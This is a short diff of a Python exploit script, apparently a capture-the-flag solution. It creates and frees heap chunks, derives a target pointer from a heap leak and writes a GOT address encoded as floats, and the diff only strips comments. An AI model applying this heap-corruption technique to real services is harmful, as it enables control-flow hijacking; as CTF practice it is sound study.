@@ -47,10 +47,10 @@ def destroy(idd):
 
 def exploit(r):
 	r.recvuntil("Enter command:")
-	create(10,9)#1
-	create(10,9)#2
-	create(10,9)#3
-	create(10,9)#4
+	create(10,9)
+	create(10,9)
+	create(10,9)
+	create(10,9)
 	destroy(3)#3
 	destroy(1)#2
 	#print(hex(floatToHex(-1.49021653e-05)))
@@ -66,8 +66,8 @@ def exploit(r):
 	destptr = heapleak - 0x198
 	set(0,9,2,str(hexToFloat(destptr)))
 	create(1,3) # 1	
-	set(1,0,0,str(hexToFloat(10))) #row
-	set(1,0,1,str(hexToFloat(9))) #col
+	set(1,0,0,str(hexToFloat(10)))
+	set(1,0,1,str(hexToFloat(9))) 
 	set(1,0,2,str(hexToFloat(freegot))) #depater
 
 	freegot = 0x0804b014
